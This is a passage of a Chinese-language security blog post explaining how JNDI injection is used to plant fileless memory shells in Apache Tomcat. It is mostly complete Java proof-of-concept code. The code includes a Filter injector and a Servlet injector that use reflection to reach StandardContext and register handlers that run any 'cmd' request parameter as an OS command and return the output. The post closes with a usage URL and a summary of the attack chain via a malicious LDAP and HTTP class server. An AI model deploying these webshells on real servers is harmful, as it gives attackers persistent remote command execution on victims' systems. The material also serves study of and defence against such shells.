+<p>直接给POC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.ParallelWebappClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.webresources.StandardRoot;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterInject_2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FilterInject_2</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取 StandardContext</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">ParallelWebappClassLoader</span> <span class="variable">pwcl</span> <span class="operator">=</span> (ParallelWebappClassLoader) cl;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> getFieldFromHierarchy(pwcl.getClass(), <span class="string">&quot;resources&quot;</span>);</span><br><span class="line">        resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resources</span> <span class="operator">=</span> resourcesField.get(pwcl);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> extractContext(resources);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 匿名内部类直接写，也不需要用ClassLoader.defineClass()了</span></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span><br><span class="line">                    <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream())</span><br><span class="line">                    );</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        sb.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.getWriter().print(sb.toString());</span><br><span class="line">                    <span class="keyword">return</span>;  <span class="comment">// 不向下传递，直接返回结果</span></span><br><span class="line">                &#125;</span><br><span class="line">                chain.doFilter(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注册 Filter 到 StandardContext</span></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        filterDef.setFilter(evilFilter);</span><br><span class="line">        filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        standardContext.addFilterMap(filterMap);</span><br><span class="line">        <span class="comment">// 激活，使Filter生效</span></span><br><span class="line">        standardContext.filterStart();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Filter memory shell injected!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title function_">getFieldFromHierarchy</span><span class="params">(Class&lt;?&gt; clazz, String name)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123; <span class="keyword">return</span> clazz.getDeclaredField(name); &#125;</span><br><span class="line">            <span class="keyword">catch</span> (NoSuchFieldException e) &#123; clazz = clazz.getSuperclass(); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> StandardContext <span class="title function_">extractContext</span><span class="params">(Object resources)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (resources <span class="keyword">instanceof</span> StandardRoot) &#123;</span><br><span class="line">            <span class="type">StandardRoot</span> <span class="variable">sr</span> <span class="operator">=</span> (StandardRoot) resources;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> sr.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ctx</span> <span class="operator">=</span> f.get(sr);</span><br><span class="line">            <span class="keyword">if</span> (ctx <span class="keyword">instanceof</span> StandardContext) <span class="keyword">return</span> (StandardContext) ctx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Servlet内存马变体"><a href="#Servlet内存马变体" class="headerlink" title="Servlet内存马变体"></a>Servlet内存马变体</h2><p>思路完全一样，只是把”注册Filter”换成”注册Servlet”，再举例一个。</p>
+<h3 id="EvilServlet-java"><a href="#EvilServlet-java" class="headerlink" title="EvilServlet.java"></a>EvilServlet.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">            resp.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Servlet is running...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ServletInject-java"><a href="#ServletInject-java" class="headerlink" title="ServletInject.java"></a>ServletInject.java</h3><p>StandardContext的获取方式完全不变，区别只在于注册部分——Filter用的是FilterDef+FilterMap，Servlet用的是StandardWrapper：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.ParallelWebappClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.webresources.StandardRoot;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Servlet;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletInject</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServletInject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取 StandardContext（和Filter注入完全一样）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">ParallelWebappClassLoader</span> <span class="variable">pwcl</span> <span class="operator">=</span> (ParallelWebappClassLoader) cl;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">resourcesField</span> <span class="operator">=</span> getFieldFromHierarchy(pwcl.getClass(), <span class="string">&quot;resources&quot;</span>);</span><br><span class="line">        resourcesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resources</span> <span class="operator">=</span> resourcesField.get(pwcl);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> extractContext(resources);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 还原 EvilServlet 对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> <span class="string">&quot;......&quot;</span>;  <span class="comment">// 替换为EvilServlet的Base64字符串</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = Base64.getDecoder().decode(b64);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(</span><br><span class="line">                <span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class</span><br><span class="line">        );</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Class&lt;?&gt; servletClass = (Class&lt;?&gt;) defineClass.invoke(cl, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">        <span class="type">Servlet</span> <span class="variable">evilServlet</span> <span class="operator">=</span> (Servlet) servletClass.getDeclaredConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注册方式和Filter不同，Servlet用StandardWrapper</span></span><br><span class="line">        <span class="comment">// 1. 创建 StandardWrapper 包装 Servlet</span></span><br><span class="line">        <span class="type">StandardWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardWrapper</span>();</span><br><span class="line">        wrapper.setName(<span class="string">&quot;evilServlet&quot;</span>);</span><br><span class="line">        wrapper.setServlet(evilServlet);</span><br><span class="line">        wrapper.setServletClass(evilServlet.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 将 Wrapper 添加到 StandardContext 的子容器中</span></span><br><span class="line">        standardContext.addChild(wrapper);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 添加 URL 映射（和filter不同）</span></span><br><span class="line">        standardContext.addServletMappingDecoded(<span class="string">&quot;/evil&quot;</span>, <span class="string">&quot;evilServlet&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Servlet memory shell injected!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Field <span class="title function_">getFieldFromHierarchy</span><span class="params">(Class&lt;?&gt; clazz, String name)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123; <span class="keyword">return</span> clazz.getDeclaredField(name); &#125;</span><br><span class="line">            <span class="keyword">catch</span> (NoSuchFieldException e) &#123; clazz = clazz.getSuperclass(); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> StandardContext <span class="title function_">extractContext</span><span class="params">(Object resources)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (resources <span class="keyword">instanceof</span> StandardRoot) &#123;</span><br><span class="line">            <span class="type">StandardRoot</span> <span class="variable">sr</span> <span class="operator">=</span> (StandardRoot) resources;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> sr.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ctx</span> <span class="operator">=</span> f.get(sr);</span><br><span class="line">            <span class="keyword">if</span> (ctx <span class="keyword">instanceof</span> StandardContext) <span class="keyword">return</span> (StandardContext) ctx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>触发后访问 <code>http://localhost:8080/evil?cmd=ipconfig</code> 即可执行命令：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260422155052944.png"></p>
+<p>其他内存马同理。</p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整个JNDI注入内存马的链路：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">控制 lookup() 参数</span><br><span class="line">    → marshalsec（LDAP服务）返回 Reference</span><br><span class="line">        → 被攻击方从HTTP服务下载恶意class</span><br><span class="line">            → JDK内部自动调用 URLClassLoader.defineClass() 加载</span><br><span class="line">                → 自动调用构造方法</span><br><span class="line">                    → 反射链获取 StandardContext</span><br><span class="line">                    → 手动 defineClass 还原恶意Filter字节码</span><br><span class="line">                    → 反射实例化 Filter 对象</span><br><span class="line">                    → 动态注册到 StandardContext</span><br><span class="line">                    → filterStart() 激活生效</span><br></pre></td></tr></table></figure>
+
+<p>核心利用了两个Java特性：</p>
+<ul>
+<li><strong>JNDI的远程类加载机制</strong>：Reference + codebase 实现远程加载任意类，JDK内部自动走完defineClass整个流程</li>
+<li><strong>构造方法自动执行</strong>：类实例化时构造函数必然触发，是恶意代码的天然入口</li>
+</ul>
+<p>两种恶意Filter传递方案的对比：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Base64嵌入方案</th>
+<th>匿名内部类方案</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HTTP服务文件数</td>
+<td>1个</td>
+<td>2个（主类+内部类）</td>
+</tr>
+<tr>
+<td>lookup次数</td>
+<td>1次</td>
+<td>1次</td>
+</tr>
+<tr>
+<td>代码复杂度</td>
+<td>高（需要反射defineClass）</td>
+<td>低（直接new匿名类）</td>
+</tr>
+<tr>
+<td>原理</td>
+<td>手动defineClass还原EvilFilter</td>
+<td>JVM自动加载内部类class</td>
+</tr>
+</tbody></table>
+<p>既然Filter和Servlet都能注入，Listener、Valve、Agent内存马也同理，换对应的注册API就行，后续再写。</p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="welcome-text" style="text-align: center; padding: 10px 0; font-size: 14px; color: #fff;">欢迎入侵本站</div><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-JNDI%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC-%E2%80%94%E2%80%94-ldap-Tomcat-Filter-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0"><span class="toc-text">原理分析 | JNDI注入内存马 —— ldap + Tomcat Filter + 无文件落地</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%91%98%E8%A6%81"><span class="toc-text">摘要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJNDI%E6%B3%A8%E5%85%A5"><span class="toc-text">什么是JNDI注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E8%A1%A5%E5%85%85%EF%BC%9Alookup%E5%8F%82%E6%95%B0%E6%80%8E%E4%B9%88%E7%8E%A9"><span class="toc-text">前提补充：lookup参数怎么玩</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#marshalsec%E5%81%9A%E7%9A%84%E4%BA%8B%E6%83%85"><span class="toc-text">marshalsec做的事情</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9C%80%E8%A6%81%E8%B5%B7%E7%9A%84%E6%9C%8D%E5%8A%A1%E4%B8%80%E5%85%B1%E4%B8%A4%E4%B8%AA"><span class="toc-text">需要起的服务一共两个</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E"><span class="toc-text">补充说明</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-text">搭建漏洞服务端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E6%94%BB%E5%87%BB%E7%AB%AF"><span class="toc-text">搭建攻击端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%8B%86%E8%A7%A3"><span class="toc-text">思路拆解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%B8%80%EF%BC%9A%E6%81%B6%E6%84%8FFilter%E6%80%8E%E4%B9%88%E4%BC%A0%E8%BF%87%E5%8E%BB"><span class="toc-text">问题一：恶意Filter怎么传过去</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%BA%8C%EF%BC%9AStandardContext%E6%80%8E%E4%B9%88%E6%8B%BF"><span class="toc-text">问题二：StandardContext怎么拿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%B8%89%EF%BC%9AFilter%E6%80%8E%E4%B9%88%E6%B3%A8%E5%86%8C"><span class="toc-text">问题三：Filter怎么注册</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">完整代码实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8FFilter%EF%BC%9AEvilFilter-java"><span class="toc-text">恶意Filter：EvilFilter.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7%EF%BC%9AClassToBase64-java"><span class="toc-text">辅助工具：ClassToBase64.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%EF%BC%9AFilterInject-java"><span class="toc-text">注入类：FilterInject.java</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">打入内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB%E6%96%B9%E6%A1%88"><span class="toc-text">匿名内部类方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%98%E4%BD%93"><span class="toc-text">Servlet内存马变体</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EvilServlet-java"><span class="toc-text">EvilServlet.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ServletInject-java"><span class="toc-text">ServletInject.java</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
